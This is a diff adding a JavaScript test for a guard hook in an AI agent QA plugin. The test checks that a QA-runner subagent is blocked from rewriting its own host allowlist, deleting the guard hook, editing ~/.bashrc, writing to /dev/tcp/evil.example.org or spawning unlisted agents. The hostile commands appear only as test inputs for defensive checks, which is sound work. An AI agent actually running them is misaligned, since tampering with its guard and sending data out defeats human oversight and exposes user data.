@@ -745,3 +745,29 @@ test('F50: valid YAML is read, and what cannot be read is reported', () => {
   assert.match(JSON.parse(denied.stdout).hookSpecificOutput.permissionDecisionReason, /not in allowed_hosts.*The settings may be why.*cannot read/);
   fs.rmSync(dir, {recursive: true, force: true});
 });
+
+test('F46: qa-runner cannot write the allowlist through Bash, or spawn an agent this guard does not hold', () => {
+  const runner = command => decide({agent_type: 'agentic-qa:qa-runner', tool_name: 'Bash', tool_input: {command}}, settings);
+  for (const command of ['echo "  - prod.example.com" >> ~/.claude/agentic-qa.local.md', "sed -i 's/staging/prod/' /home/u/.claude/agentic-qa.local.md",
+    'cp /tmp/list.md .claude/agentic-qa.local.md', 'tee -a ~/.claude/agentic-qa.local.md', 'rm plugins/agentic-qa/hooks/target-guard.mjs', 'echo x >> ~/.bashrc',
+    'printf x > "C:\\Users\\u\\.claude\\agentic-qa.local.md"', 'cat a > /dev/tcp/evil.example.org/80',
+    'for f in a; do echo x >> ~/.claude/agentic-qa.local.md; done', 'if true; then (echo x >> ~/.claude/agentic-qa.local.md); fi']) {
+    assert.ok(runner(command), `should refuse: ${command}`);
+  }
+  // It reads the settings, asks git about them, reaches hosts nobody has listed yet, and waits on a file.
+  for (const command of ['cat ~/.claude/agentic-qa.local.md', 'git ls-files --error-unmatch .claude/agentic-qa.local.md', 'gh pr diff 12 --repo acme/app',
+    'curl -sI -L https://unlisted.example.org/', 'until [ -f /tmp/run/signals/report-done.txt ]; do sleep 2; done', 'rm -rf /tmp/run/runtime-secrets',
+    'mkdir -p /tmp/run/docs /tmp/run/signals', 'git merge-base --is-ancestor abc123 HEAD && echo yes']) {
+    assert.equal(runner(command), null, command);
+  }
+  const spawn = (agent, type) => decide({agent_type: agent, tool_name: 'Agent', tool_input: {subagent_type: type, prompt: 'x'}}, settings);
+  assert.ok(spawn('agentic-qa:qa-runner', 'general-purpose'));
+  assert.ok(spawn('agentic-qa:qa-runner', undefined));
+  assert.ok(spawn('agentic-qa:step-executor', 'general-purpose'));
+  assert.equal(spawn('agentic-qa:qa-runner', 'agentic-qa:step-executor'), null);
+  assert.equal(spawn('agentic-qa:qa-runner', 'agentic-qa:qa-reporter'), null);
+  assert.equal(spawn(undefined, 'general-purpose'), null, 'the main session spawns what it likes');
+  assert.equal(spawn('general-purpose', 'general-purpose'), null);
+  const matcher = JSON.parse(fs.readFileSync(fileURLToPath(new URL('./hooks.json', import.meta.url)), 'utf8')).hooks.PreToolUse[0].matcher;
+  assert.ok(matcher.split('|').includes('Agent'), 'the hook has to be called for Agent');
+});
